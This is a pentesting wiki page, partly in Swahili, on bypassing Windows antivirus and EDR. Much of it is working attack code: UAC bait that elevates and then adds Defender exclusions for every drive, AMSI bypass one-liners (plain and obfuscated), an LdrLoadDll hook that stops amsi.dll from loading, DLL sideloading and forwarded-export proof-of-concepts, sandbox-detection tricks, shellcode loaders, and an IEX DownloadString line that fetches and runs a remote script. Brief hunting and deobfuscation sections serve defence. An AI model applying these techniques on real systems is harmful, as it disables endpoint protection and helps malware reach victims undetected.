# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ukurasa huu uliandikwa awali na** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Chombo cha kusimamisha Windows Defender isifanye kazi.
- [no-defender](https://github.com/es3n1n/no-defender): Chombo cha kusimamisha Windows Defender kwa kujifanya AV nyingine.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Public loaders masquerading as game cheats frequently ship as unsigned Node.js/Nexe installers that first **ask the user for elevation** and only then neuter Defender. The flow is simple:

1. Probe for administrative context with `net session`. The command only succeeds when the caller holds admin rights, so a failure indicates the loader is running as a standard user.
2. Immediately relaunch itself with the `RunAs` verb to trigger the expected UAC consent prompt while preserving the original command line.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Waathirika tayari wanaamini kwamba wanapakua programu “cracked”, hivyo ombi hilo kwa kawaida hukubaliwa, na kumpa malware haki zinazohitaji ili kubadilisha policy ya Defender.

### Blanket `MpPreference` exclusions for every drive letter

Mara tu inapopandishwa hadhi, chains za mtindo wa GachiLoader huongeza blind spots za Defender badala ya kuzima service moja kwa moja. Loader kwanza huua GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) kisha huweka **extremely broad exclusions** ili kila user profile, system directory, na removable disk lisichunguzwe:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Maoni muhimu:

- Loops huenda kupitia kila filesystem iliyomountiwa (D:\, E:\, USB sticks, etc.) hivyo **payload yoyote ya baadaye itakayotupwa popote diskini inapuuzwa**.
- Uondoaji wa extension ya `.sys` ni wa kuangalia mbele—attackers huweka chaguo la kupakia unsigned drivers baadaye bila kugusa Defender tena.
- Mabadiliko yote yanaingia chini ya `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, hivyo hatua za baadaye zinaweza kuthibitisha exclusions zinaendelea kuwepo au kuziongeza bila kuchochea UAC tena.

Kwa sababu hakuna huduma ya Defender inayosimamishwa, health checks za kawaida zinaendelea kuripoti “antivirus active” ingawa real-time inspection haigusi hizo paths.

## **AV Evasion Methodology**

Kwa sasa, AVs hutumia mbinu tofauti kuangalia kama file ni malicious au la, static detection, dynamic analysis, na kwa EDRs za juu zaidi, behavioural analysis.

### **Static detection**

Static detection hupatikana kwa kuflag strings zinazojulikana kuwa malicious au arrays za bytes ndani ya binary au script, na pia kutoa taarifa kutoka ndani ya file lenyewe (k.m. file description, company name, digital signatures, icon, checksum, etc.). Hii inamaanisha kuwa kutumia public tools zinazojulikana kunaweza kukufanya ushikwe kwa urahisi zaidi, kwa sababu pengine tayari zimechambuliwa na kuflagwa kama malicious. Kuna njia kadhaa za kuepuka aina hii ya detection:

- **Encryption**

Ukiencrypt binary, hakutakuwa na njia ya AV kugundua program yako, lakini utahitaji aina fulani ya loader ya kudecrypt na kuendesha program hiyo memory.

- **Obfuscation**

Wakati mwingine unachohitaji ni kubadilisha baadhi ya strings kwenye binary au script yako ili ipite AV, lakini hili linaweza kuwa kazi ya kuchukua muda kulingana na unachojaribu obfuscate.

- **Custom tooling**

Ukiunda tools zako mwenyewe, hakutakuwa na known bad signatures, lakini hii inachukua muda mwingi na juhudi.

> [!TIP]
> Njia nzuri ya kuangalia Windows Defender static detection ni [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Kimsingi hugawa file katika segments nyingi kisha huiambia Defender ichunguze kila moja kivyake, kwa njia hii, inaweza kukuonyesha hasa strings au bytes zipi zimeflagwa ndani ya binary yako.

Ninapendekeza sana uangalie hii [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) kuhusu practical AV Evasion.

### **Dynamic analysis**

Dynamic analysis ni wakati AV inakimbiza binary yako ndani ya sandbox na kuangalia malicious activity (k.m. kujaribu kudecrypt na kusoma passwords za browser yako, kufanya minidump kwenye LSASS, etc.). Sehemu hii inaweza kuwa ngumu zaidi kufanyia kazi, lakini hapa kuna baadhi ya mambo unayoweza kufanya ili kuepuka sandboxes.

- **Sleep before execution** Kulingana na jinsi ilivyoimplementation, inaweza kuwa njia nzuri ya bypassing AV's dynamic analysis. AV's zina muda mfupi sana wa kuchunguza files ili zisivuruge workflow ya user, hivyo kutumia long sleeps kunaweza kuvuruga analysis ya binaries. Tatizo ni kwamba sandboxes nyingi za AV zinaweza tu kuruka sleep kulingana na jinsi ilivyoimplementation.
- **Checking machine's resources** Kwa kawaida Sandboxes huwa na resources chache sana za kutumia (k.m. < 2GB RAM), vinginevyo zinaweza kupunguza kasi ya machine ya user. Unaweza pia kuwa creative hapa, kwa mfano kwa kuangalia CPU's temperature au hata fan speeds, si kila kitu kitapangwa ndani ya sandbox.
- **Machine-specific checks** Ikiwa unataka kumlenga user ambaye workstation yake imeunganishwa kwenye domain ya "contoso.local", unaweza kufanya check kwenye domain ya computer kuona kama inalingana na ile uliyobainisha; kama haifanani, unaweza kufanya program yako itoke.

Inaonekana kwamba computername ya Microsoft Defender's Sandbox ni HAL9TH, hivyo unaweza kuangalia computer name ndani ya malware yako kabla ya detonation; ikiwa name inalingana na HAL9TH, inamaanisha uko ndani ya defender's sandbox, hivyo unaweza kufanya program yako itoke.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Baadhi ya tips nyingine nzuri sana kutoka kwa [@mgeeky](https://twitter.com/mariuszbit) za kwenda kinyume na Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Kama tulivyosema hapo awali kwenye post hii, **public tools** hatimaye **zitagunduliwa**, kwa hiyo unapaswa kujijiuliza kitu:

Kwa mfano, kama unataka dump LSASS, **je, kweli unahitaji kutumia mimikatz**? Au unaweza kutumia project nyingine ambayo haijulikani sana na pia hufanya dump LSASS.

Jibu sahihi huenda likawa la pili. Tuchukue mimikatz kama mfano, huenda ni mojawapo ya, kama siyo, malware iliyoflagwa zaidi na AVs na EDRs, na ingawa project yenyewe ni nzuri sana, pia ni ndoto mbaya kufanya kazi nayo ili kuepuka AVs, hivyo tafuta tu alternatives kwa kile unachojaribu kufanikisha.

> [!TIP]
> Unapomodify payloads zako kwa ajili ya evasion, hakikisha **umezima automatic sample submission** katika defender, na tafadhali, kwa umakini kabisa, **USIPAKIE KWENYE VIRUSTOTAL** ikiwa lengo lako ni kufanikisha evasion kwa muda mrefu. Ikiwa unataka kuangalia kama payload yako inagunduliwa na AV fulani, isakinishe kwenye VM, jaribu kuzima automatic sample submission, na ijaribu hapo hadi uridhike na matokeo.

## EXEs vs DLLs

Wakati wowote inapowezekana, kila mara **ipa kipaumbele kutumia DLLs kwa ajili ya evasion**, kwa uzoefu wangu, faili za DLL kwa kawaida **hugunduliwa na kuchambuliwa kwa kiwango kidogo zaidi**, hivyo ni trick rahisi sana kutumia ili kuepuka detection katika baadhi ya hali (ikiwa payload yako ina njia yoyote ya kuendeshwa kama DLL bila shaka).

Kama tunavyoona kwenye picha hii, DLL Payload kutoka Havoc ina detection rate ya 4/26 katika antiscan.me, wakati EXE payload ina detection rate ya 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Sasa tutaonyesha baadhi ya tricks unazoweza kutumia na faili za DLL ili kuwa stealthier zaidi.

## DLL Sideloading & Proxying

**DLL Sideloading** hutumia advantage ya DLL search order inayotumiwa na loader kwa kuweka application ya victim na malicious payload(s) pembeni kwa pamoja.

Unaweza kuangalia programs zinazoweza kuathiriwa na DLL Sideloading kwa kutumia [Siofra](https://github.com/Cybereason/siofra) na powershell script ifuatayo:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Amri hii itatoa orodha ya programu zinazoweza kuathiriwa na DLL hijacking ndani ya "C:\Program Files\\" na faili za DLL wanazojaribu kupakia.

Ninapendekeza sana **uchunguze mwenyewe programu zinazoweza kuwa DLL Hijackable/Sideloadable**, mbinu hii ni ya kujificha sana ikifanywa vizuri, lakini ukitumia programu za DLL Sideloadable zinazojulikana hadharani, unaweza kushikwa kwa urahisi.

Kwa kuweka tu DLL hasidi lenye jina ambalo programu inatarajia kupakia, halitaipakia payload yako, kwa kuwa programu inatarajia baadhi ya functions mahususi ndani ya DLL hiyo, ili kurekebisha tatizo hili, tutatumia mbinu nyingine inayoitwa **DLL Proxying/Forwarding**.

**DLL Proxying** hupeleka calls ambazo programu hufanya kutoka kwenye proxy (na hasidi) DLL kwenda kwenye DLL asilia, hivyo kuhifadhi utendaji wa programu na kuweza kushughulikia execution ya payload yako.

Nitatumia mradi wa [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) kutoka kwa [@flangvik](https://twitter.com/Flangvik/)

Hizi ndizo hatua nilizofuata:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Amri ya mwisho itatupatia faili 2: kiolezo cha msimbo chanzo cha DLL, na DLL ya awali iliyopewa jina jipya.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Haya ndiyo matokeo:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Shellcode yetu yote miwili (iliyocoded kwa kutumia [SGN](https://github.com/EgeBalci/sgn)) na proxy DLL zina kiwango cha Ugunduzi 0/26 katika [antiscan.me](https://antiscan.me)! Ningeliita hilo mafanikio.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ninapendekeza sana uangalie [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) kuhusu DLL Sideloading na pia [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ili ujifunze zaidi kuhusu tulichojadili kwa kina zaidi.

### Kunyanyasa Forwarded Exports (ForwardSideLoading)

Windows PE modules zinaweza ku-export functions ambazo kwa kweli ni "forwarders": badala ya kuelekeza kwenye code, entry ya export ina ASCII string ya umbo `TargetDll.TargetFunc`. Wakati caller inaporesolve export, Windows loader itafanya:

- Kupakia `TargetDll` ikiwa bado haijapakiwa
- Kuresolve `TargetFunc` kutoka humo

Tabia muhimu za kuelewa:
- Ikiwa `TargetDll` ni KnownDLL, hutolewa kutoka kwenye namespace iliyolindwa ya KnownDLLs (kwa mfano, ntdll, kernelbase, ole32).
- Ikiwa `TargetDll` si KnownDLL, normal DLL search order inatumika, ambayo inajumuisha directory ya module inayofanya forward resolution.

Hii inawezesha primitive ya indirect sideloading: pata signed DLL inayoforward function kwenda kwa jina la module lisilo KnownDLL, kisha weka DLL hiyo iliyosainiwa pamoja na attacker-controlled DLL yenye jina sawa kabisa na target module iliyoforwardiwa. Wakati forwarded export inaitwa, loader huresolve forward na kupakia DLL yako kutoka kwenye directory hiyo hiyo, ikitekeleza DllMain yako.

Mfano ulioonekana kwenye Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` si KnownDLL, kwa hiyo hutatuliwa kupitia mpangilio wa kawaida wa utafutaji.

PoC (copy-paste):
1) Nakili signed system DLL kwenda kwenye folda inayoweza kuandikwa
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Weka `NCRYPTPROV.dll` mbaya kwenye folda hiyo hiyo. `DllMain` ndogo tu inatosha kupata utekelezaji wa code; huhitaji kutekeleza function iliyo forwarded ili kuamsha `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Anzisha forward kwa signed LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) hupakia side-by-side `keyiso.dll` (signed)
- Wakati wa kutatua `KeyIsoSetAuditingInterface`, loader hufuata forward hadi `NCRYPTPROV.SetAuditingInterface`
- Kisha loader hupakia `NCRYPTPROV.dll` kutoka `C:\test` na kutekeleza `DllMain` yake
- Ikiwa `SetAuditingInterface` haijatekelezwa, utapata hitilafu ya "missing API" tu baada ya `DllMain` kuwa tayari ime-run

Hunting tips:
- Zingatia forwarded exports ambapo target module si KnownDLL. KnownDLLs zimeorodheshwa chini ya `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Unaweza kuenumerate forwarded exports kwa kutumia tooling kama:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Tazama orodha ya forwarder ya Windows 11 ili kutafuta wagombea: https://hexacorn.com/d/apis_fwd.txt

Mawazo ya utambuzi/ulinzi:
- Fuatilia LOLBins (kwa mfano, rundll32.exe) zikipakia signed DLLs kutoka non-system paths, kisha kupakia non-KnownDLLs zenye base name ileile kutoka kwenye directory hiyo
- Toa tahadhari kwenye process/module chains kama: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` chini ya user-writable paths
- Tekeleza code integrity policies (WDAC/AppLocker) na kataza write+execute ndani ya application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Unaweza kutumia Freeze kupakia na kutekeleza shellcode yako kwa njia ya siri.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ni mchezo wa paka na panya tu, kile kinachofanya kazi leo kinaweza kugunduliwa kesho, kwa hiyo usiwahi kutegemea chombo kimoja tu, ikiwezekana, jaribu kuunganisha mbinu nyingi za evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs mara nyingi huweka **user-mode inline hooks** kwenye `ntdll.dll` syscall stubs. Ili kupita hooks hizo, unaweza kutengeneza **direct** au **indirect** syscall stubs zinazopakia **SSN** sahihi (System Service Number) na kuhamia kernel mode bila kutekeleza hooked export entrypoint.

**Chaguo za invocation:**
- **Direct (embedded)**: toa maagizo ya `syscall`/`sysenter`/`SVC #0` ndani ya stub iliyotengenezwa (hakuna `ntdll` export hit).
- **Indirect**: ruka kwenda kwenye `syscall` gadget iliyopo ndani ya `ntdll` ili kernel transition ionekane kama imetoka `ntdll` (inafaa kwa heuristic evasion); **randomized indirect** huchagua gadget kutoka kwenye pool kwa kila call.
- **Egg-hunt**: epuka kuembed static `0F 05` opcode sequence kwenye disk; resolve syscall sequence wakati wa runtime.

**Mikakati ya SSN resolution inayostahimili hooks:**
- **FreshyCalls (VA sort)**: infer SSNs kwa kupanga syscall stubs kwa virtual address badala ya kusoma stub bytes.
- **SyscallsFromDisk**: map clean `\KnownDlls\ntdll.dll`, soma SSNs kutoka `.text` yake, kisha unmap (inapita hooks zote za in-memory).
- **RecycledGate**: changanya VA-sorted SSN inference na opcode validation wakati stub ni clean; rudia kwenye VA inference ikiwa imehookiwa.
- **HW Breakpoint**: weka DR0 kwenye instruction ya `syscall` na tumia VEH kukamata SSN kutoka `EAX` wakati wa runtime, bila kuchambua hooked bytes.

Mfano wa matumizi ya SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI iliundwa ili kuzuia "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Mwanzoni, AVs ziliweza tu kuchanganua **files on disk**, kwa hiyo kama ungeweza kwa namna fulani kuendesha payloads **directly in-memory**, AV isingeweza kufanya lolote kuizuia, kwa sababu haikuwa na mwonekano wa kutosha.

Kipengele cha AMSI kimeunganishwa katika vipengele hivi vya Windows.

- User Account Control, au UAC (elevation ya EXE, COM, MSI, au ActiveX installation)
- PowerShell (scripts, matumizi ya moja kwa moja, na dynamic code evaluation)
- Windows Script Host (wscript.exe na cscript.exe)
- JavaScript na VBScript
- Office VBA macros

Inaruhusu antivirus solutions kukagua tabia ya script kwa kufichua contents za script katika umbo ambalo halijasimbwa na halikufichwa.

Kuendesha `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` kutatoa alert ifuatayo kwenye Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Angalia jinsi inavyotanguliza `amsi:` na kisha path kwenda kwenye executable ambayo script ilikimbia kutoka kwayo, katika kesi hii, powershell.exe

Hatukutoa file yoyote kwenye disk, lakini bado tulinaswa in-memory kwa sababu ya AMSI.

Zaidi ya hayo, kuanzia **.NET 4.8**, C# code pia hupitia AMSI. Hii hata huathiri `Assembly.Load(byte[])` ili kupakia in-memory execution. Ndio maana kutumia lower versions za .NET (kama 4.7.2 au chini yake) kunapendekezwa kwa in-memory execution kama unataka kuepuka AMSI.

Kuna njia kadhaa za kuizunguka AMSI:

- **Obfuscation**

Kwa kuwa AMSI hasa hufanya kazi na static detections, kwa hiyo, kurekebisha scripts unazojaribu kupakia kunaweza kuwa njia nzuri ya kuzuia detection.

Hata hivyo, AMSI ina uwezo wa kuondoa obfuscation ya scripts hata kama zina layers nyingi, kwa hiyo obfuscation inaweza kuwa chaguo baya kutegemea jinsi inavyofanywa. Hii hufanya iwe si rahisi sana kuiepuka. Ingawa, wakati mwingine, unachohitaji ni kubadilisha majina machache ya variables na utakuwa sawa, kwa hiyo inategemea ni kiasi gani kitu kimeflagwa.

- **AMSI Bypass**

Kwa kuwa AMSI imetekelezwa kwa kupakia DLL ndani ya process ya powershell (pia cscript.exe, wscript.exe, n.k.), inawezekana kui-tamper kwa urahisi hata ukiwa unaendesha kama unprivileged user. Kwa sababu ya flaw hii katika implementation ya AMSI, researchers wamepata njia nyingi za kuevade AMSI scanning.

**Forcing an Error**

Kulazimisha initialization ya AMSI ishindwe (amsiInitFailed) kitaleta matokeo kwamba hakuna scan itakayoanzishwa kwa current process. Hapo awali hili lilifunuliwa na [Matt Graeber](https://twitter.com/mattifestation) na Microsoft imeunda signature ili kuzuia matumizi mapana zaidi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Ilichukua tu mstari mmoja wa msimbo wa powershell kufanya AMSI isiweze kutumika kwa powershell process ya sasa. Bila shaka mstari huu umeflagwa na AMSI yenyewe, hivyo marekebisho fulani yanahitajika ili kutumia mbinu hii.

Hapa kuna modified AMSI bypass niliyochukua kutoka kwenye hii [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Kumbuka kwamba, hili lina uwezekano mkubwa wa kuonekana kama hatari mara post hii itakapotoka, kwa hiyo hupaswi kuchapisha code yoyote ikiwa mpango wako ni kubaki bila kugunduliwa.

**Memory Patching**

Mbinu hii iligunduliwa awali na [@RastaMouse](https://twitter.com/_RastaMouse/) na inahusisha kutafuta address ya function ya "AmsiScanBuffer" ndani ya amsi.dll (inayohusika na kuchanganua input inayotolewa na user) na kuibadilisha kwa instructions za kurudisha code ya E_INVALIDARG, kwa njia hii, result ya scan halisi itarudi 0, ambayo hutafsiriwa kama result safi.

> [!TIP]
> Tafadhali soma [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) kwa maelezo ya kina zaidi.

Pia zipo mbinu nyingi nyingine zinazotumiwa kupita AMSI kwa powershell, angalia [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) na [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) ili kujifunza zaidi kuzihusu.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI huanzishwa tu baada ya `amsi.dll` kupakiwa ndani ya current process. Njia thabiti, isiyotegemea lugha, ya bypass ni kuweka user‑mode hook kwenye `ntdll!LdrLoadDll` ambayo inarudisha error wakati module iliyoombwa ni `amsi.dll`. Matokeo yake, AMSI haipakwi kabisa na hakuna scans zinazofanyika kwa process hiyo.

Muhtasari wa implementation (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Hufanya kazi across PowerShell, WScript/CScript and custom loaders alike (anything that would otherwise load AMSI).
- Pair with feeding scripts over stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) to avoid long command‑line artefacts.
- Seen used by loaders executed through LOLBins (e.g., `regsvr32` calling `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Remove the detected signature**

You can use a tool such as **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** and **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** to remove the detected AMSI signature from the memory of the current process. This tool works by scanning the memory of the current process for the AMSI signature and then overwriting it with NOP instructions, effectively removing it from memory.

**AV/EDR products that uses AMSI**

You can find a list of AV/EDR products that uses AMSI in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
If you use PowerShell version 2, AMSI will not be loaded, so you can run your scripts without being scanned by AMSI. You can do this:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging ni kipengele kinachokuwezesha kurekodi amri zote za PowerShell zinazoendeshwa kwenye system. Hii inaweza kuwa ya manufaa kwa ajili ya auditing na troubleshooting, lakini pia inaweza kuwa **tatizo kwa attackers wanaotaka kuepuka detection**.

Ili bypass PowerShell logging, unaweza kutumia techniques zifuatazo:

- **Disable PowerShell Transcription and Module Logging**: Unaweza kutumia tool kama [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) kwa madhumuni haya.
- **Use Powershell version 2**: Ukitumia PowerShell version 2, AMSI haitapakiwa, hivyo unaweza kuendesha scripts zako bila kuchunguzwa na AMSI. Unaweza kufanya hivi: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Tumia [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) ku-spawn powershell bila defenses (hii ndiyo `powerpick` kutoka Cobal Strike hutumia).


## Obfuscation

> [!TIP]
> Several obfuscation techniques relies on encrypting data, which will increase the entropy of the binary which will make easier for AVs and EDRs to detect it. Be careful with this and maybe only apply encryption to specific sections of your code that is sensitive or needs to be hidden.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wakati wa kuchambua malware inayotumia ConfuserEx 2 (au commercial forks) ni kawaida kukutana na layers kadhaa za protection ambazo zitazuia decompilers na sandboxes. Workflow hapa chini kwa uhakika **hurejesha IL karibu ya asili** ambayo baadaye inaweza decompile-ishwa kwenda C# kwa tools kama dnSpy au ILSpy.

1.  Anti-tampering removal – ConfuserEx inencrypt kila *method body* na kuidecrypt ndani ya static constructor ya *module* (`<Module>.cctor`). Hii pia hupatch PE checksum hivyo mabadiliko yoyote yata-crash binary. Tumia **AntiTamperKiller** kupata encrypted metadata tables, recover XOR keys na rewrite assembly safi:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output ina vigezo 6 vya anti-tamper (`key0-key3`, `nameHash`, `internKey`) ambavyo vinaweza kuwa muhimu unapojenga unpacker yako mwenyewe.

2.  Symbol / control-flow recovery – peleka file *safi* kwa **de4dot-cex** (fork ya de4dot inayojua ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – chagua ConfuserEx 2 profile
• de4dot itaondoa control-flow flattening, kurejesha original namespaces, classes na variable names na ku-decrypt constant strings.

3.  Proxy-call stripping – ConfuserEx hubadilisha direct method calls kuwa lightweight wrappers (yaani *proxy calls*) ili kuvunja decompilation zaidi. Zitoe kwa **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Baada ya hatua hii unapaswa kuona kawaida .NET API kama `Convert.FromBase64String` au `AES.Create()` badala ya opaque wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – endesha binary iliyopatikana ndani ya dnSpy, tafuta large Base64 blobs au matumizi ya `RijndaelManaged`/`TripleDESCryptoServiceProvider` ili kupata *real* payload. Mara nyingi malware huihifadhi kama TLV-encoded byte array iliyoanzishwa ndani ya `<Module>.byte_0`.

Mlolongo huu hapo juu hurejesha execution flow **bila** kuhitaji kuendesha malicious sample – muhimu unapofanya kazi kwenye offline workstation.

> 🛈  ConfuserEx hutengeneza custom attribute inayoitwa `ConfusedByAttribute` ambayo inaweza kutumika kama IOC kwa triage ya samples kiotomatiki.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Lengo la mradi huu ni kutoa fork ya chanzo-wazi ya [LLVM](http://www.llvm.org/) compilation suite inayoweza kuongeza usalama wa programu kupitia [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) na tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator inaonyesha jinsi ya kutumia `C++11/14` lugha ili kuzalisha, wakati wa compile, code iliyofichwa bila kutumia tool yoyote ya nje na bila kurekebisha compiler.
- [**obfy**](https://github.com/fritzone/obfy): Ongeza layer ya operations zilizofichwa zinazozalishwa na C++ template metaprogramming framework ambayo itafanya maisha ya mtu anayetaka kupasua application kuwa magumu kidogo.
